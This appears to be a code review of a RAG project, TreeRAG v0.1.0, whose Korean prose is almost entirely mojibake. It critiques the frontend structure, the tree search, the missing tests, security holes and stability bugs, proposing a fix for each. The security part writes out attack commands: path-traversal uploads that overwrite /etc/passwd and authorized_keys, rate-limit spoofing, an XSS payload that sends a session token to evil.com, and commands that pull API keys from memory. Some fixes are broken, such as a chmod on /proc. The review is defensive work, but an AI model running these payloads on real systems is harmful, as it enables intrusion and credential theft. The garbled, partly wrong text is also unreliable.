# TreeRAG ì¢…í•© ë¹„íŒ: í”„ë¡œí† íƒ€ì…ì—ì„œ í”„ë¡œë•ì…˜ìœ¼ë¡œ ê°€ëŠ” ê¸¸

**ì‘ì„±ì¼:** 2026ë…„ 2ì›” 4ì¼  
**í‰ê°€ ëŒ€ìƒ:** TreeRAG v0.1.0  
**ìµœì¢… í‰ê°€:** PoC(ê°œë… ì¦ëª…)ë¡œëŠ” ìš°ìˆ˜í•˜ë‚˜, í”„ë¡œë•ì…˜ ë°°í¬ëŠ” ì ˆëŒ€ ë¶ˆê°€

---

## Executive Summary

TreeRAGëŠ” **í˜ì‹ ì ì¸ ê°œë…**(ë²¡í„° DB ì—†ëŠ” íŠ¸ë¦¬ ê¸°ë°˜ RAG)ì„ êµ¬í˜„í–ˆì§€ë§Œ, **ì‹¬ê°í•œ ì•„í‚¤í…ì²˜ ê²°í•¨**, **10ê°œ ì´ìƒì˜ ë³´ì•ˆ ì·¨ì•½ì **, **í…ŒìŠ¤íŠ¸ ë° ì•ˆì •ì„±ì˜ ì „ë¬´**ë¡œ ì¸í•´ í˜„ì¬ ìƒíƒœë¡œëŠ” í”„ë¡œë•ì…˜ ë°°í¬ê°€ ë¶ˆê°€ëŠ¥í•˜ë‹¤.

| ë¶„ì•¼ | í‰ê°€ | ìƒíƒœ |
|------|------|------|
| ê¸°ìˆ  ê°œë… | â­â­â­â­â­ | í˜ì‹ ì  |
| êµ¬í˜„ í’ˆì§ˆ | â­â­ | ë¯¸í¡ |
| ë³´ì•ˆ | ğŸ”´ğŸ”´ğŸ”´ | ìœ„í—˜ |
| í…ŒìŠ¤íŠ¸ | ğŸŸ¡ | ë¶€ì¡± |
| í”„ë¡œë•ì…˜ ì¤€ë¹„ë„ | ğŸ”´ | ì „í˜€ ì¤€ë¹„ ì•ˆ ë¨ |

---

## Part 1. ì•„í‚¤í…ì²˜ ìˆ˜ì¤€ì˜ ê·¼ë³¸ì  ë¬¸ì œ

### 1. í”„ë¡ íŠ¸ì—”ë“œ: 1,500ì¤„ ìŠ¤íŒŒê²Œí‹° ì½”ë“œ

**í˜„í™©:** `frontend/app/page.tsx` - 1,519ì¤„ ë‹¨ì¼ íŒŒì¼

```tsx
export default function Home() {
  const [sessions, setSessions] = useState<ChatSession[]>([]);
  const [currentSessionId, setCurrentSessionId] = useState<string | null>(null);
  const [input, setInput] = useState("");
  const [isUploading, setIsUploading] = useState(false);
  const [isGenerating, setIsGenerating] = useState(false);
  // ... 15ê°œ ì´ìƒì˜ useState
}
```

**ë¬¸ì œì :**

1. **UI ì»´í¬ë„ŒíŠ¸, ìƒíƒœ ê´€ë¦¬, API í˜¸ì¶œ, ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì´ í•œ íŒŒì¼ì— ë’¤ì„ì„**
   - ê¸°ëŠ¥ í•˜ë‚˜ ìˆ˜ì •í•˜ë©´ 3ê³³ì´ í„°ì§
   - ì¬ì‚¬ìš© ë¶ˆê°€ëŠ¥
   - í…ŒìŠ¤íŠ¸ ë¶ˆê°€ëŠ¥

2. **ì „ì—­ ìƒíƒœ ê´€ë¦¬ ì „ë¬´**
   - useStateë§Œ 15ê°œ ì´ìƒ â†’ prop drilling ì§€ì˜¥
   - Context APIë„ ì—†ìŒ â†’ ìƒíƒœ ì¶”ì  ë¶ˆê°€ëŠ¥

3. **ì„±ëŠ¥ ìµœì í™” ì „ë¬´**
   - useMemo, useCallback ì—†ìŒ
   - ëª¨ë“  ìƒíƒœ ë³€ê²½ ì‹œ ì „ì²´ ì»´í¬ë„ŒíŠ¸ ë¦¬ë Œë”ë§
   - 1,000ê°œ ë©”ì‹œì§€ ìˆìœ¼ë©´ â†’ ìŠ¤í¬ë¡¤ë„ ëŠê¹€

**ì‹¬ê°ë„:** ğŸ”´ Critical  
**ì˜í–¥:** ìœ ì§€ë³´ìˆ˜ ë¶ˆê°€ëŠ¥, ìƒˆë¡œìš´ ê¸°ëŠ¥ ì¶”ê°€ ì‹œ ë²„ê·¸ í­ë°œ

**í•´ê²°ì±…:**
```
components/
â”œâ”€â”€ ChatInterface/
â”‚   â”œâ”€â”€ ChatBox.tsx
â”‚   â”œâ”€â”€ MessageList.tsx
â”‚   â”œâ”€â”€ InputBox.tsx
â”‚   â””â”€â”€ hooks/
â”‚       â””â”€â”€ useChat.ts
â”œâ”€â”€ TreeViewer/
â”‚   â”œâ”€â”€ TreeView.tsx
â”‚   â”œâ”€â”€ TreeNode.tsx
â”‚   â””â”€â”€ hooks/
â”‚       â””â”€â”€ useTreeData.ts
â”œâ”€â”€ DocumentSidebar/
â”‚   â”œâ”€â”€ DocumentList.tsx
â”‚   â””â”€â”€ DocumentUpload.tsx
â””â”€â”€ PerformanceDashboard/
    â”œâ”€â”€ CacheStats.tsx
    â”œâ”€â”€ RateLimitIndicator.tsx
    â””â”€â”€ hooks/
        â””â”€â”€ useDashboard.ts

context/
â”œâ”€â”€ ChatContext.tsx
â”œâ”€â”€ DocumentContext.tsx
â””â”€â”€ SettingsContext.tsx
```

---

### 2. Vectorless ì•„í‚¤í…ì²˜: í˜ì‹ ì¸ê°€, ìœ„í—˜í•œ ë„ë°•ì¸ê°€?

**í˜„í™©:** ë²¡í„° DB ì—†ì´ íŠ¸ë¦¬ êµ¬ì¡°ë§Œìœ¼ë¡œ RAG êµ¬í˜„

```python
# src/core/tree_traversal.py: max_depth=5, max_branches=3ìœ¼ë¡œ ì œí•œëœ íŠ¸ë¦¬ íƒìƒ‰
def search(self, query: str, max_depth: int = 5, max_branches: int = 3):
    self._traverse_node(root, query, current_depth=0, ...)
```

**í˜ì‹ ì  ì¸¡ë©´:**
- âœ… 90% ì»¨í…ìŠ¤íŠ¸ ì ˆê° (í‰ê· )
- âœ… API ë¹„ìš© 70% ê°ì†Œ
- âœ… êµ¬ì¡°ì  ë§¥ë½ ë³´ì¡´ â†’ ë” ì •í™•í•œ ë‹µë³€

**ìœ„í—˜í•œ ì¸¡ë©´:**

1. **íš¡ì  ì§ˆë¬¸(Cross-cutting Query) ì²˜ë¦¬ ë¶ˆëŠ¥**
   ```
   ì‚¬ìš©ì: "ì „ì²´ ë¬¸ì„œì—ì„œ 'ë¦¬ìŠ¤í¬'ê°€ ì–¸ê¸‰ëœ ëª¨ë“  ë¶€ë¶„ì„ ì°¾ì•„ì¤˜"
   â†’ íŠ¸ë¦¬ ì „ì²´ ìˆœíšŒ í•„ìš”
   â†’ max_depth=5, max_branches=3 ë¬´ìš©ì§€ë¬¼
   â†’ ì‹œìŠ¤í…œ: "ê´€ë ¨ ë…¸ë“œ ëª» ì°¾ìŒ"
   ```

2. **ë¹„ì •í˜• ì§ˆë¬¸ì— LLM ì˜¤ë²„í—¤ë“œ ê°€ì¤‘**
   ```
   ì‚¬ìš©ì: "ê·¸ë¦¼ê³¼ í‘œë¥¼ ë¶„ì„í•´ì¤˜"
   â†’ íŠ¸ë¦¬ê°€ êµ¬ì¡°í™”í•œ í…ìŠ¤íŠ¸ë§Œ ë´„
   â†’ ì´ë¯¸ì§€ëŠ” ë²„ë ¤ì§
   â†’ ë‹µë³€ ë¶€ì •í™•ì„± ì¦ê°€ â†’ ì¬ì§ˆë¬¸ â†’ API ë¹„ìš© ì¦ê°€
   ```

3. **ì§ˆë¬¸-ë¬¸ì„œ êµ¬ì¡° ë¶ˆì¼ì¹˜ ì‹œ ë¹„íš¨ìœ¨**
   ```
   ë¬¸ì„œ êµ¬ì¡°: [ì œ1ì¥] [ì œ2ì¥] [ì œ3ì¥]
   ì‚¬ìš©ì ì§ˆë¬¸: "A, B, C ëª¨ë‘ì—ì„œ ê³µí†µì ì„ ì°¾ì•„ì¤˜"
   â†’ 3ê°œ ë¸Œëœì¹˜ ëª¨ë‘ íƒìƒ‰ í•„ìš”
   â†’ max_branches=3 ì´ˆê³¼ ê°€ëŠ¥
   â†’ API í˜¸ì¶œ í­ì¦
   ```

**ì‹¬ê°ë„:** ğŸŸ  High (íŠ¹ì • ì‚¬ìš© ì‚¬ë¡€ì—ë§Œ ë¬¸ì œ)  
**ì˜í–¥:** 30% ì‚¬ìš© ì‚¬ë¡€ì—ì„œ API ë¹„ìš©ì´ ì˜ˆìƒì˜ 3ë°° ì´ìƒ

**í•´ê²°ì±…:**
```python
# í•˜ì´ë¸Œë¦¬ë“œ ê²€ìƒ‰ ë„ì…
class HybridSearcher:
    def search(self, query: str):
        # 1ë‹¨ê³„: ì„ë² ë”© ê¸°ë°˜ ì˜ë¯¸ë¡ ì  ê²€ìƒ‰ (ë¹ ë¦„)
        semantic_candidates = self.vector_search(query, top_k=20)
        
        # 2ë‹¨ê³„: í•´ë‹¹ ë…¸ë“œì˜ ë¶€ë¶„ íŠ¸ë¦¬ë§Œ ê¹Šê²Œ íƒìƒ‰
        for node in semantic_candidates:
            self.traverse_subtree(node, query, max_depth=3)
        
        # 3ë‹¨ê³„: ê²°ê³¼ ì§‘ê³„
        return self.aggregate_results()
```

---

### 3. í…ŒìŠ¤íŠ¸: ì—”ì§„ì€ ì•ˆ ê³ ì¹˜ê³  ì™€ì´í¼ë§Œ ë‹¦ìŒ

**í˜„í™©:**
```
tests/
â”œâ”€â”€ test_cache.py        âœ… 12ê°œ í…ŒìŠ¤íŠ¸
â”œâ”€â”€ test_hallucination_detector.py âœ… 17ê°œ í…ŒìŠ¤íŠ¸
â”œâ”€â”€ test_api.py          âš ï¸ ê¸°ë³¸ ì—”ë“œí¬ì¸íŠ¸ë§Œ
â””â”€â”€ test_indexer.py      âŒ ì—†ìŒ
```

**ë¹„íŒì :**

1. **ì½”ì–´ ë¡œì§ì— ëŒ€í•œ E2E í…ŒìŠ¤íŠ¸ ì „ë¬´**
   ```python
   # âŒ í…ŒìŠ¤íŠ¸ ì—†ìŒ: PDF â†’ Tree JSON ë³€í™˜
   # test_indexer.py ë¶€ì¬
   pdf_bytes â†’ extract_text() â†’ create_index() â†’ JSON
   â†’ ì´ íŒŒì´í”„ë¼ì¸ì—ì„œ ì‹¤ì œë¡œ ë­ê°€ ë‚˜ì˜¤ëŠ”ì§€ ê²€ì¦ ë¶ˆê°€
   ```

2. **Tree Traversal ì•ˆì •ì„± í…ŒìŠ¤íŠ¸ ì—†ìŒ**
   ```python
   # âŒ í…ŒìŠ¤íŠ¸ ì—†ìŒ: ë¬´í•œë£¨í”„ ë°©ì§€
   # ìˆœí™˜ ì°¸ì¡°ê°€ ìˆëŠ” íŠ¸ë¦¬?
   # max_depth ì˜¤ë²„í”Œë¡œìš°?
   # ë¹ˆ íŠ¸ë¦¬?
   # â†’ ë‹¤ í™•ì¸ ì•ˆ ë¨
   ```

3. **Integration í…ŒìŠ¤íŠ¸ ì „ë¬´**
   ```python
   # âŒ í…ŒìŠ¤íŠ¸ ì—†ìŒ: ì „ì²´ RAG íŒŒì´í”„ë¼ì¸
   # 1. PDF ì—…ë¡œë“œ
   # 2. ì¸ë±ì‹±
   # 3. ì§ˆë¬¸
   # 4. ë‹µë³€ ìƒì„±
   # 5. ì‘ë‹µ ë°˜í™˜
   # â†’ ì´ 5ë‹¨ê³„ ì¤‘ ì–´ë””ì„œ ë¬¸ì œ ìƒê¸°ëŠ”ì§€ í™•ì¸ ë¶ˆê°€
   ```

4. **Regression í…ŒìŠ¤íŠ¸ ì—†ìŒ**
   ```python
   # 31ë²ˆ ì»¤ë°‹í–ˆëŠ”ë°, ì´ì „ ê¸°ëŠ¥ì´ ê¹¨ì¡ŒëŠ”ì§€ í™•ì¸í•  ë°©ë²•ì´ ì—†ìŒ
   # ì½”ë“œ ë³€ê²½ í›„ ë§¤ë²ˆ ìˆ˜ë™ìœ¼ë¡œ PDF ì˜¬ë ¤ì„œ í…ŒìŠ¤íŠ¸?
   # ê·¸ëŸ¼ ì–¸ì œê¹Œì§€ ìŠ¤ì¼€ì¼ë§ ê°€ëŠ¥?
   ```

**ì‹¬ê°ë„:** ğŸ”´ Critical  
**ì˜í–¥:** ë²„ê·¸ ë°œìƒ ì‹œ ì›ì¸ íŒŒì•… ë¶ˆê°€ëŠ¥, ë°°í¬ í›„ ì¥ì•  ë¹ˆë²ˆ

**í•´ê²°ì±…:**
```python
# tests/test_indexer.py - E2E í…ŒìŠ¤íŠ¸
import pytest
from src.core.indexer import RegulatoryIndexer

@pytest.fixture
def sample_pdf_path():
    """í…ŒìŠ¤íŠ¸ìš© PDF ìƒì„±"""
    return "tests/fixtures/sample_document.pdf"

def test_pdf_to_tree_structure(sample_pdf_path):
    """PDF â†’ Tree JSON ë³€í™˜ ê²€ì¦"""
    indexer = RegulatoryIndexer()
    text = indexer.extract_text(sample_pdf_path)
    tree = indexer.create_index("Sample Doc", text)
    
    # ê²€ì¦: Tree êµ¬ì¡°
    assert "id" in tree
    assert "title" in tree
    assert "children" in tree
    assert len(tree["children"]) > 0
    
    # ê²€ì¦: ëª¨ë“  ë…¸ë“œê°€ í•„ìˆ˜ í•„ë“œ í¬í•¨
    def validate_node(node):
        assert "id" in node
        assert "title" in node
        assert "summary" in node
        assert "page_ref" in node
        if "children" in node:
            for child in node["children"]:
                validate_node(child)
    
    validate_node(tree)

def test_tree_traversal_no_infinite_loop(sample_tree_with_cycle):
    """ìˆœí™˜ ì°¸ì¡° íŠ¸ë¦¬ì—ì„œë„ ë¬´í•œë£¨í”„ ë°©ì§€"""
    navigator = TreeNavigator(sample_tree_with_cycle, "Test Doc")
    results, stats = navigator.search("test query", max_depth=5)
    
    assert len(results) >= 0  # í¬ë˜ì‹œ ì•ˆ í•¨
    assert stats["nodes_visited"] <= 100  # ë¬´í•œë£¨í”„ ì•ˆ í•¨

def test_full_rag_pipeline():
    """ì „ì²´ RAG íŒŒì´í”„ë¼ì¸ E2E í…ŒìŠ¤íŠ¸"""
    # 1. PDF ì—…ë¡œë“œ
    response = client.post("/upload", files={"file": open("sample.pdf", "rb")})
    assert response.status_code == 200
    collection_id = response.json()["collection_id"]
    
    # 2. ì§ˆë¬¸
    response = client.post("/chat", json={
        "collection_id": collection_id,
        "query": "What is the main topic?"
    })
    assert response.status_code == 200
    
    # 3. ì‘ë‹µ ê²€ì¦
    data = response.json()
    assert "answer" in data
    assert len(data["answer"]) > 0
    assert "metadata" in data
```

---

## Part 2. ë³´ì•ˆ: 10ê°œ ì´ìƒì˜ ì·¨ì•½ì 

### 4. ì¹˜ëª…ì  ë³´ì•ˆ ê²°í•¨ë“¤

#### 4.1 íŒŒì¼ ì—…ë¡œë“œ: Path Traversal ê³µê²© ê°€ëŠ¥

**í˜„í™©:**
```python
# src/api/routes.py - íŒŒì¼ëª… ê²€ì¦ ì—†ìŒ
@router.post("/upload")
async def upload_pdfs(files: List[UploadFile] = File(...)):
    for file in files:
        file_path = os.path.join(Config.RAW_DATA_DIR, file.filename)  # ğŸ’£
        with open(file_path, "wb") as f:
            shutil.copyfileobj(file.file, f)
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**
```bash
# ê³µê²© 1: ì‹œìŠ¤í…œ íŒŒì¼ ë®ì–´ì“°ê¸°
curl -F "files=@malware.pdf;filename=../../../../etc/passwd" \
     http://localhost:8000/api/upload
# â†’ /etc/passwd ë®ì–´ì“°ê¸° (ê´€ë¦¬ì ê¶Œí•œ ì‹œ)

# ê³µê²© 2: ì‹¤í–‰ íŒŒì¼ ì—…ë¡œë“œ
curl -F "files=@shell.sh;filename=../../var/www/html/shell.sh" \
     http://localhost:8000/api/upload
# â†’ ì›¹ ë””ë ‰í† ë¦¬ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì €ì¥

# ê³µê²© 3: ë‹¤ì¤‘ ì í”„
curl -F "files=@exploit;filename=../../../root/.ssh/authorized_keys" \
     http://localhost:8000/api/upload
# â†’ SSH í‚¤ ë®ì–´ì“°ê¸° â†’ ì„œë²„ ì™„ì „ ì¥ì•…
```

**ì‹¬ê°ë„:** ğŸ”´ Critical (CVSS 9.8)  
**í•´ê²°ì±…:**
```python
import os
from pathlib import Path

ALLOWED_EXTENSIONS = {'.pdf'}
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB

async def upload_pdfs(files: List[UploadFile] = File(...)):
    for file in files:
        # 1. íŒŒì¼ëª… ì •ê·œí™”
        filename = Path(file.filename).name  # âœ… ../ ì œê±°
        
        # 2. í™•ì¥ì ê²€ì¦
        if not any(filename.endswith(ext) for ext in ALLOWED_EXTENSIONS):
            raise HTTPException(
                status_code=400,
                detail=f"Only PDF files allowed, got {filename}"
            )
        
        # 3. íŒŒì¼ í¬ê¸° ê²€ì¦
        contents = await file.read()
        if len(contents) > MAX_FILE_SIZE:
            raise HTTPException(
                status_code=413,
                detail="File too large"
            )
        
        # 4. MIME íƒ€ì… ê²€ì¦
        if file.content_type not in ["application/pdf"]:
            raise HTTPException(
                status_code=400,
                detail="Invalid MIME type"
            )
        
        # 5. ì¤‘ë³µ íŒŒì¼ëª… ì²˜ë¦¬
        safe_filename = f"{uuid.uuid4()}_{filename}"
        file_path = os.path.join(Config.RAW_DATA_DIR, safe_filename)
        
        # 6. ê²½ë¡œ í™•ì¸ (ì ˆëŒ€ ê²½ë¡œ ë²—ì–´ë‚˜ëŠ”ì§€ ê²€ì¦)
        if not os.path.abspath(file_path).startswith(
            os.path.abspath(Config.RAW_DATA_DIR)
        ):
            raise HTTPException(status_code=400, detail="Invalid path")
        
        with open(file_path, "wb") as f:
            f.write(contents)
```

---

#### 4.2 Rate Limiting: ìš°íšŒ ê°€ëŠ¥

**í˜„í™©:**
```python
# src/api/routes.py
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/chat")
@limiter.limit("30/minute")
async def chat_endpoint(request: Request, ...):
    pass
```

**ìš°íšŒ ë°©ë²•:**

```bash
# ë°©ë²• 1: X-Forwarded-For í—¤ë” ì¡°ì‘
for i in {1..1000}; do
  curl -H "X-Forwarded-For: 192.168.1.$i" \
       http://localhost:8000/api/chat
done
# ê²°ê³¼: Rate Limit ë¬´ë ¥í™” âœ… 1000ê°œ ìš”ì²­ ì„±ê³µ

# ë°©ë²• 2: í”„ë¡ì‹œë¥¼ í†µí•œ ë¶„ì‚°
# Tor ë„¤íŠ¸ì›Œí¬ ì´ìš©í•˜ë©´ IP ê³„ì† ë³€ê²½
# â†’ ê° ìš”ì²­ì´ ë‹¤ë¥¸ IPë¡œ ë³´ì„
# â†’ Rate Limit ìš°íšŒ ê°€ëŠ¥

# ë°©ë²• 3: ë¶€í•˜ ë¶„ì‚°ê¸° ë’¤ì—ì„œëŠ” ëª¨ë“  ìš”ì²­ì´ ê°™ì€ IPë¡œ ë³´ì„
# ê²°ê³¼: ì •ìƒ ì‚¬ìš©ìë“¤ì´ ìƒí˜¸ ì°¨ë‹¨ (ë¶€ì‘ìš©)
```

**ì‹¬ê°ë„:** ğŸ”´ Critical (CVSS 8.6)  
**í•´ê²°ì±…:**
```python
from fastapi_limiter import FastAPILimiter
from fastapi_limiter.depends import RateLimiter
from redis import Redis

# Redis ê¸°ë°˜ ë¶„ì‚° Rate Limiting
redis = Redis(host='localhost', port=6379, db=0)
FastAPILimiter.init(redis)

@router.post("/chat")
async def chat_endpoint(
    request: Request,
    limiter: RateLimiter = Depends(
        RateLimiter(times=30, seconds=60)
    ),
    auth: str = Header(...)  # ì¸ì¦ í•„ìˆ˜
):
    # API í‚¤ ê¸°ë°˜ Rate Limiting â†’ IP ìŠ¤í‘¸í•‘ ë¶ˆê°€ëŠ¥
    pass
```

---

#### 4.3 XSS: ìºì‹œëœ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰

**í˜„í™©:**
```tsx
// frontend/app/page.tsx (ì¶”ì •)
<div dangerouslySetInnerHTML={{__html: message.content}} />
// ë˜ëŠ”
<ReactMarkdown>{message.content}</ReactMarkdown>  // html={true}ì¸ ê²½ìš°
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**

```
1. ì•…ì˜ì  ì‚¬ìš©ìê°€ PDFì— í¬í•¨:
   <script>fetch('https://evil.com/steal?data=' + localStorage.token)</script>

2. LLMì´ ë‹µë³€ì— ê·¸ëŒ€ë¡œ í¬í•¨

3. ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ê°™ì€ ë¬¸ì„œ ì§ˆë¬¸

4. ìºì‹œëœ XSS í˜ì´ë¡œë“œ ì‹¤í–‰
   â†’ í† í° íƒˆì·¨
   â†’ ì„¸ì…˜ í•˜ì´ì¬í‚¹
   â†’ ë‹¤ë¥¸ ì‚¬ìš©ì ê³„ì •ìœ¼ë¡œ ì•…ì˜ì  í–‰ë™
```

**ì‹¬ê°ë„:** ğŸ”´ Critical (CVSS 7.2)  
**í•´ê²°ì±…:**
```tsx
import DOMPurify from 'dompurify';
import ReactMarkdown from 'react-markdown';

// ë°©ë²• 1: í…ìŠ¤íŠ¸ë§Œ ë Œë”ë§ (ê¶Œì¥)
<div>{message.content}</div>

// ë°©ë²• 2: HTML í•„ìš”ì‹œ Sanitization
<div>
  {DOMPurify.sanitize(message.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  })}
</div>

// ë°©ë²• 3: Markdownë§Œ ì§€ì› (HTML íƒœê·¸ ë¬´ì‹œ)
<ReactMarkdown
  disallowedElements={['script', 'iframe']}
  unwrapDisallowed={true}
>
  {message.content}
</ReactMarkdown>
```

---

#### 4.4 API í‚¤ ë…¸ì¶œ ìœ„í—˜

**í˜„í™©:**
```python
# src/config.py
api_key = os.getenv("GOOGLE_API_KEY")
if not api_key:
    raise ValueError("âŒ .env íŒŒì¼ì— GOOGLE_API_KEYê°€ ì—†ìŠµë‹ˆë‹¤.")  # ğŸ’£ í‚¤ ì´ë¦„ ë…¸ì¶œ

# docker-compose.yml
environment:
  - GOOGLE_API_KEY=${GOOGLE_API_KEY}
```

**ìœ„í—˜:**

```bash
# 1. ì—ëŸ¬ ë©”ì‹œì§€ê°€ GitHub Actions ë¡œê·¸ì— ë‚¨ìŒ
# â†’ "GOOGLE_API_KEYê°€ ì—†ìŠµë‹ˆë‹¤" ì—ëŸ¬ ë©”ì‹œì§€ ê³µê°œ
# â†’ ê³µê²©ì: "ì´ ì„œë¹„ìŠ¤ëŠ” Google Gemini ì“´ë‹¤" íŒŒì•…

# 2. Docker logsì— ê·¸ëŒ€ë¡œ ë‚¨ìŒ
docker-compose logs
# Output: GOOGLE_API_KEY=AIzaSyCqF7SDC3NRHNW_6wEPajPE-WMYGWwDlo8

# 3. ì»¨í…Œì´ë„ˆ í™˜ê²½ ë³€ìˆ˜ í™•ì¸
docker exec treerag-backend env | grep API_KEY

# 4. í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ ë¤í”„
sudo gcore $(pgrep uvicorn)
strings core.* | grep AIzaSy
```

**ì‹¬ê°ë„:** ğŸ”´ Critical (CVSS 6.8)  
**í•´ê²°ì±…:**
```python
# 1. ì—ëŸ¬ ë©”ì‹œì§€ì— ë¯¼ê°í•œ ì •ë³´ ë…¸ì¶œ ê¸ˆì§€
try:
    api_key = os.getenv("GOOGLE_API_KEY")
    if not api_key:
        raise ValueError("Missing required environment variable")
except ValueError:
    logger.error("Configuration error", exc_info=True)
    raise

# 2. Docker ë‚´ì—ì„œ ì‹œí¬ë¦¿ ë§ˆìš´íŠ¸
# docker-compose.yml
services:
  backend:
    secrets:
      - google_api_key
    environment:
      - GOOGLE_API_KEY_FILE=/run/secrets/google_api_key

secrets:
  google_api_key:
    file: ./secrets/google_api_key.txt

# 3. í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ ë³´í˜¸
# /proc/{pid}/environì„ root ì™¸ì— ì½ì„ ìˆ˜ ì—†ê²Œ
sudo chmod 600 /proc/*/environ

# 4. ì»¨í…Œì´ë„ˆ read-only íŒŒì¼ì‹œìŠ¤í…œ
# docker-compose.yml
read_only: true
tmpfs:
  - /tmp
  - /var/cache
```

---

### 5. ì•ˆì •ì„± ê²°í•¨

#### 5.1 ë¬´í•œ ì¬ê·€: ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš° ê°€ëŠ¥

**í˜„í™©:**
```python
# src/core/tree_traversal.py (line 48-58)
def _traverse_node(self, node, query, current_depth, max_depth, ...):
    if node_id in self.visited_nodes:
        return  # ì´ê²Œ ì „ë¶€? ìˆœí™˜ ì°¸ì¡° í™•ì¸ë§Œ í•¨
    
    # ... 
    if current_depth < max_depth and node.get("children"):
        for child in children:
            self._traverse_node(child, query, current_depth + 1, ...)
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**

```bash
# ê³µê²© 1: ìˆœí™˜ ì°¸ì¡°ê°€ ìˆëŠ” JSON ì—…ë¡œë“œ
{
  "id": "1",
  "title": "Root",
  "children": [
    {
      "id": "2",
      "title": "Child",
      "children": [
        { "ref": "1" }  # ìì‹ ì˜ ë¶€ëª¨ë¥¼ ë‹¤ì‹œ ì°¸ì¡°!
      ]
    }
  ]
}
# ê²°ê³¼: A â†’ B â†’ A â†’ B â†’ ... (ë¬´í•œ ì¬ê·€)

# ê³µê²© 2: max_depth ì˜¤ë²„í”Œë¡œìš°
curl -X POST http://localhost:8000/api/chat \
  -d '{"max_depth": 999999}'
# Python ê¸°ë³¸ ì¬ê·€ í•œê³„: 1000
# ê²°ê³¼: RecursionError â†’ ì„œë²„ í¬ë˜ì‹œ
```

**ì‹¬ê°ë„:** ğŸŸ  High (CVSS 7.5)  
**í•´ê²°ì±…:**
```python
class TreeNavigator:
    MAX_DEPTH_LIMIT = 10  # í•˜ë“œ ë¦¬ë°‹
    MAX_NODES_LIMIT = 1000  # ë°©ë¬¸ ë…¸ë“œ ì œí•œ
    
    def search(self, query, max_depth=5, max_branches=3):
        # 1. ì‚¬ìš©ì ì…ë ¥ ê²€ì¦
        max_depth = min(max_depth, self.MAX_DEPTH_LIMIT)
        
        self.node_count = 0
        self.visited_nodes = set()
        
        try:
            self._traverse_node(root, query, current_depth=0, ...)
        except RecursionError:
            raise HTTPException(
                status_code=503,
                detail="Search complexity exceeded"
            )
    
    def _traverse_node(self, node, query, current_depth, max_depth, ...):
        # 2. ì¤‘ë³µ ë°©ë¬¸ í™•ì¸
        node_id = node.get("id")
        if node_id in self.visited_nodes:
            return
        
        self.visited_nodes.add(node_id)
        self.node_count += 1
        
        # 3. ë…¸ë“œ ìˆ˜ ì œí•œ
        if self.node_count > self.MAX_NODES_LIMIT:
            raise HTTPException(
                status_code=503,
                detail="Search scope too large"
            )
        
        # 4. ê¹Šì´ ì œí•œ
        if current_depth >= max_depth:
            return
        
        # 5. ì¬ê·€ í˜¸ì¶œ
        for child in node.get("children", []):
            self._traverse_node(child, query, current_depth + 1, ...)
```

---

#### 5.2 ë©”ëª¨ë¦¬ ëˆ„ìˆ˜: PDF ì „ì²´ë¥¼ ë©”ëª¨ë¦¬ì— ë¡œë“œ

**í˜„í™©:**
```python
# src/core/indexer.py (line 20-35)
def extract_text(self, pdf_path: str) -> str:
    reader = PdfReader(pdf_path)
    full_text = ""
    for i, page in enumerate(reader.pages):
        text = page.extract_text()
        if text:
            full_text += f"\n--- [Page {i+1}] ---\n{text}"  # ğŸ’£ O(nÂ²) ë³µì¡ë„
    return full_text
```

**ë¬¸ì œ:**

```
ë¬¸ìì—´ ë¶ˆë³€ì„± ë•Œë¬¸ì—:
- 100í˜ì´ì§€: "" â†’ s1 â†’ s2 â†’ ... â†’ s100
  ê° ë‹¨ê³„ë§ˆë‹¤ ìƒˆ ë¬¸ìì—´ ìƒì„± + ì´ì „ ë¬¸ìì—´ ë©”ëª¨ë¦¬ ë‚­ë¹„
  ì‹œê°„ë³µì¡ë„: O(nÂ²) = 100 * 99 / 2 = 4,950ë²ˆ ë³µì‚¬

- 1,000í˜ì´ì§€: ~500,000ë²ˆ ë³µì‚¬
- 10,000í˜ì´ì§€ (ê¸ˆìœµë³´ê³ ì„œ): ~50,000,000ë²ˆ ë³µì‚¬ â†’ ë©”ëª¨ë¦¬ í„°ì§

ë™ì‹œì— 5ëª…ì´ 10,000í˜ì´ì§€ PDF ì—…ë¡œë“œ:
ì´ ë©”ëª¨ë¦¬ ì‚¬ìš©: 50GB ì´ìƒ
â†’ ì„œë²„ ë‹¤ìš´
```

**ì‹¬ê°ë„:** ğŸŸ  High (CVSS 5.9)  
**í•´ê²°ì±…:**
```python
def extract_text(self, pdf_path: str) -> str:
    reader = PdfReader(pdf_path)
    text_parts = []  # ë¦¬ìŠ¤íŠ¸ ì‚¬ìš© â†’ O(n) ë³µì¡ë„
    
    for i, page in enumerate(reader.pages):
        text = page.extract_text()
        if text:
            text_parts.append(f"\n--- [Page {i+1}] ---\n{text}")
    
    # í•œ ë²ˆì— ì¡°ì¸
    return "".join(text_parts)  # O(n)

# ë˜ëŠ” ìŠ¤íŠ¸ë¦¬ë° ì²˜ë¦¬
def extract_text_streaming(self, pdf_path: str):
    """ì œë„ˆë ˆì´í„°ë¡œ ë©”ëª¨ë¦¬ íš¨ìœ¨ì  ì²˜ë¦¬"""
    reader = PdfReader(pdf_path)
    for i, page in enumerate(reader.pages):
        text = page.extract_text()
        if text:
            yield f"\n--- [Page {i+1}] ---\n{text}"

# ì‚¬ìš©
full_text = "".join(self.extract_text_streaming(pdf_path))
```

---

#### 5.3 JSON íŒŒì‹±: LLM ì‘ë‹µì„ ë¬´ì¡°ê±´ ë¯¿ìŒ

**í˜„í™©:**
```python
# src/core/indexer.py (line 68-83)
try:
    response = Config.CLIENT.models.generate_content(
        model=Config.MODEL_NAME,
        contents=prompt,
        config=self.generation_config
    )
    cleaned_text = self._clean_markdown_json(response.text)
